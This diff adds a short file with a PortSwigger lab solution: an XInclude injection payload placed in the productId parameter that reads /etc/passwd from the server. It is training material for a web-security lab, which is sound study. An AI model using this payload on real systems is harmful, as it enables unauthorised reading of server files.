@@ -1,0 +1,8 @@
+<!--XXE XInclude Injection to solve the following lab:-->
+<!--https://portswigger.net/web-security/xxe/lab-xinclude-attack-->
+
+<!--Inject the following into the productId-->
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+	<xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+<!--Don't forget to add the storeId-->
